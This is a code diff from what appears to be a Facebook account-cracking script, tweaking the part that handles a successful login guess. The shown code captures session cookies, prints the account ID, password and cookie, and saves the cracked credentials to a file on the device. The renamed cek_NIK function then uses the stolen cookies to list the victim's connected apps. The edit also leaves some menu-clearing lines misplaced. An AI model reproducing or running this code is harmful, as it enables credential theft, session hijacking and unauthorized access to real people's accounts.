@@ -546,40 +546,41 @@ def crack(idf,pwv):
                                 ok+=1
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])        
-                                print(f'\r\x1b[1;96m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \33[1;96m{kuki}')
+                                print(f'\r\x1b[1;90m[RAWA-OK]\x1b[1;91m   {idf} | \x1b[0;96m{pw} | \x1b[1;96m{kuki}')
                                 open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
-                                cek_DYNO(kuki)
+                                cek_NIK(kuki)
                                 break
                         else:
                                 continue
                 except requests.exceptions.ConnectionError:
                         time.sleep(10)
         loop+=1
-def chek():
+
+def cek_NIK(kuki):
+ session = requests.Session()
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+ except AttributeError:
+  print ("\r    %s\033[0m cookie invalid"%(M))
+ w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+ sop = bs4.BeautifulSoup(w,"html.parser")
+ x = sop.find("form",method="post")
+ game = [i.text for i in x.find_all("h3")]
+ try:
+  for i in range(len(game)):
+   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+ except AttributeError:
+  print ("\r    %s \033[0mcookie invalid"%(M))
     os.system('clear')
     banner()
     menu()
-    
-def cek_DYNO(kuki):
-	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
-	except AttributeError:
-		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
-	sop = bs4.BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	try:
-		for i in range(len(game)):
-			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
-	except AttributeError:
-		print ("\r    %s \033[0mcookie invalid"%(M))
+
+
 
 
 if __name__=='__main__':
